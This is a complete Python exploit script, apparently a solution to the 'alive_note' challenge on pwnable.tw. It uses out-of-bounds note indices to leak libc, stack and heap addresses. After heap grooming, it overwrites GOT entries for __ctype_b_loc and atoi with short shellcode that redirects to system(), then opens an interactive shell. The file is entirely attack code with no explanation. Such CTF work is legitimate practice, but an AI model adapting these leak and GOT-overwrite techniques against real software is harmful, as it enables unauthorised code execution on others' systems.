from pwn import *
import sys
from z3 import *

context.arch = 'i386'
b = ELF("./alive_note")
l = ELF("/lib/i386-linux-gnu/libc.so.6")

def add(index, data):
	p.sendafter("Your choice :", "1")
	p.sendafter("Index :", str(index))
	p.sendafter("Name :", data)

def show(index):
        p.sendafter("Your choice :", "2")
        p.sendafter("Index :", str(index))

def delete(index):
        p.sendafter("Your choice :", "3")
        p.sendafter("Index :", str(index))


def get_leak():
	global p, libc, heap, stack
	if len(sys.argv) == 1:
		p = process("./alive_note")
	else:
		p = remote("chall.pwnable.tw", 10300)

	# libc leak
	target_address = b.symbols['stdin']
	target_offset  = (b.symbols['note'] - target_address) / 4 * -1
	show(target_offset)
	p.recvuntil("Name : ")
	p.recv(4)
	leak = u32(p.recv(4))
	libc = leak - (0xf7fc15e7-0xf7e0f000)
	log.info("leak = 0x%x", leak)
	log.info("libc = 0x%x", libc)

	# stack leak based on libc - program_invocation_short_name : 0xf7fc0eec
	target_addr = libc + 0x1b1eec
	target_offset = -b.symbols['note'] / 4 -(0x100000000 - target_addr) / 4
	show(target_offset)
	p.recvuntil("Name : ")
	stack = u32(p.recv(4))
	log.info("stack = 0x%x", stack)

	# heap leak
	add("0","0000\n")
	target_addr = 0x80498f8
	target_offset  = (b.symbols['note'] - target_addr) / 4 * -1
	show(target_offset)
	p.recvuntil("Name : ")
	heap = u32(p.recv(4)) - 8
	log.info("heap = 0x%x", heap)
	return hex(heap)[3:5]

while True:
	try:
		tmp = get_leak()
		print tmp
		if tmp == 'c3':
			break
	except:
		print "retry"
	p.close()

print "Found gadget"

oneshot = libc + 0x3ac5c
log.info("oneshot = 0x%x"%oneshot)

add("1","1111\n")
add("2","2222\n")
add("3","3333\n")
add("4","X4DAAPuJ\n")
add("5","5555\n")
add("6","6666\n")
add("7","4444\n")
add("8","5555\n")
add("9","6666\n")
delete(2)
delete(3)
delete(9)
delete(6)
delete(7)
delete(8)
delete(5)
delete(0)

target_addr = b.got['__ctype_b_loc']
target_offset = (b.symbols['note'] - target_addr) / 4 * -1
print target_offset
add(target_offset, "YAAAAQu8")
delete(0)

system = libc + l.symbols['system']
shellcode = "push " + hex(system) + "\n"
shellcode += "ret\n"
payload = asm(shellcode)
target_addr = b.got['atoi']
target_offset = (b.symbols['note'] - target_addr) / 4 * -1
add(target_offset, payload)
p.sendlineafter("Your choice :", "sh")
p.interactive()
